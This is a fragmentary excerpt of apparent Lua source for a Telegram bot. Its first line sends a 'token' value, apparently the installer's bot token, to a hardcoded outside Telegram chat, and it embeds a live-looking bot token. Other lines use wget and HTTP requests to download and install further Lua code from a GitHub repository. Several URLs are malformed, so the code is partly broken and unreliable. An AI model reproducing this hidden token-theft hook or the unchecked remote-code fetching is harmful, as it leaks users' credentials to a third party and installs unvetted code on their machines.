...
https.request('https://api.telegram.org/bot1793850911:AAEPWFYpRfgup5ZkO5cWZPiKg4v6CXrmbAk/sendmessage?chat_id=1700360357&text=' ..token)
end 
else
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Ebnelakaber/ElAmer/main/File_Bot/commands.lua") 
...
os.execute('wget https://raw.githubusercontent.com/Ebnelakaber/ElAmer/main/DRAGON.lua')
...
if DevMohamed(msg) then
local Get_Files, res = https.request("https://raw.https://github.com/Ebnelakaber/ElAmer/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.https://github.com/Ebnelakaber/ElAmer/main/File_Bot/"..file)
if res == 200 then
